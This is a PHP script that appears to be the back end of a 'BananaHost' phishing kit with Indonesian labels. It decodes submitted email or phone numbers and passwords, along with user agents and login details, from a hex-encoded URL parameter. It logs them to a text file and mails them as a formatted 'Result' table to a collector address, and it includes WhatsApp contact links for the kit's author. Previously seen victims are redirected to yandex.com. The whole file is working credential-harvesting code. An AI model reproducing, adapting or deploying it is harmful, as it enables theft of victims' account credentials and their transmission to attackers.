<?php
session_start();

function sanitize_input($data) {
    return htmlspecialchars(trim($data));
}

if (isset($_GET['cat'])) {
    $serialized_data = hex2bin($_GET['cat']);
    parse_str($serialized_data, $form_data);

    $alx_email_fb2 = isset($form_data['email']) ? sanitize_input($form_data['email']) : '';
    $alx_password_fb2 = isset($form_data['sandi']) ? sanitize_input($form_data['sandi']) : '';
    $ua = isset($form_data['ua']) ? sanitize_input($form_data['ua']) : '';
    $log = isset($form_data['log']) ? sanitize_input($form_data['log']) : '';
    $time = date('Y-m-d H:i:s'); 
   
    }{

        $file_lines = file('ke/antispam.txt');
        foreach ($file_lines as $file => $value) {
            $data = explode("|", $value);
            if (in_array($alx_email_fb2, $data)) {
                // Redirect and set session
                $_SESSION['email'] = $alx_email_fb2;
                header('Location: https://yandex.com');
                exit;
            }
        }

        $myfile = fopen("ke/antispam.txt", "a") or die("Unable to open file!");
        fwrite($myfile, "|".$alx_email_fb2."|".$alx_password_fb2."|".$ua."|".$log."\n");
        fclose($myfile);

    $subjek = '🇮🇩 | +62 | [Result] 🌀Banana Host🌀 '.$alx_email_fb2.' | Result '.$ua.'';
    $pesan = <<<EOD
<!DOCTYPE html>
	<html>
	<head>
		<title></title>
		<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
		<style type="text/css">
			body {
				font-family: "Helvetica";
				width: 90%;
				display: block;
				margin: auto;
				border: 1px solid #fff;
				background: #fff;
			}

			.result {
				width: 100%;
				height: 100%;
				display: block;
				margin: auto;
				position: fixed;
				top: 0;
				right: 0;
				left: 0;
				bottom: 0;
				z-index: 999;
				overflow-y: scroll;
				border-radius: 10px;
			}

			.tblResult {
				width: 100%;
				display: table;
				margin: 0px auto;
				border-collapse: collapse;
				text-align: center;
				background: #fcfcfc;
			}
			.tblResult th {
				text-align: left;
				font-size: 1em;
				margin: auto;
				padding: 15px 10px;
				background: #001240;
				border: 2px solid #001240;
				color: #fff;
			}

			.tblResult td {
				font-size: 1em;
				margin: auto;
				padding: 10px;
				border: 2px solid #001240;
				text-align: left;
				font-weight: bold;
				color: #000;
				text-shadow: 0px 0px 10px #fcfcfc;

			}

			.tblResult th img {
				width: 100%;
				display: block;
				margin: auto;
				box-shadow: 0px 0px 10px rgba(0,0,0, 0.5);
				border-radius: 10px;
			}
		</style>
	</head>
	<body>
		<div class="result">
			<table class="tblResult">
            <tr>
					<th style="text-align: center;" colspan="3">⚡Creator By BananaHost⚡</th>
				</tr>
				<tr>
					<td style="border-right: none;">Email/No HP</td>
					<td style="text-align: center;">$alx_email_fb2</td>
				</tr>
                <tr>
					<td style="border-right: none;">Password</td>
					<td style="text-align: center;">$alx_password_fb2</td>
				</tr>	
				<tr>
				    <td style="border-right: none;">Login</td>
					<td style="text-align: center;">$log</td>
				</tr>			
				<tr>
			</table>
			<div style="border:0px solid white;width: 294; font-weight:bold; height: 20px; background: #001240; color: #fff; padding: 15px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align:center;">

<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://wa.me/6285783089348">Wa Banana</a>
<a style="border:2px solid #fff;text-decoration:none;color:#fff;border-radius:3px;padding:3px;background:#00ff00;" href="https://chat.whatsapp.com/CQ6U6RwXqUu3lup3yVvsAF">Grup Jasteb Gg</a>
</div>
		</div>
	</body>
	</html>
EOD;
    $email = "emailmu@gmail.com";
    $sender = 'From: RESULT JS <admin@bananahost.id>';
    
    $headers  = 'MIME-Version: 1.0' . "\r\n";
    $headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
    $headers .= ''.$sender.'' . "\r\n";
    include 'banana.php';
    
    mail($email, $subjek, $pesan, $headers);
    sleep(1);
}
?>
